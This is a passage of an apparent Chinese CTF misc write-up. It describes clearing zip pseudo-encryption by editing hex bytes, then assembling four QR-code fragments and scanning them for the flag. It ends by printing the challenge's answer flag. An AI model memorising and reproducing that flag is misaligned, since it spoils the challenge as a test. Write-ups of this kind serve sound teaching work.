-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image014.gif" class="" title="图片">
-
-<p>第四个压缩包l.zip</p>
-<p>打开就一个文件，可能会是伪加密，试试修改下16进制数据</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image016.gif" class="" title="图片">
-
-<p>能够解压</p>
-<p>这样四张分开的二维码图片就齐了，用PowerPoint拼起来看看，进行扫描</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image018.gif" class="" title="图片">
-
-<p>得到flag，flag{d62427d8f843c98dcfa89f0ba0d1e6fe}</p>
 
       
     </div>
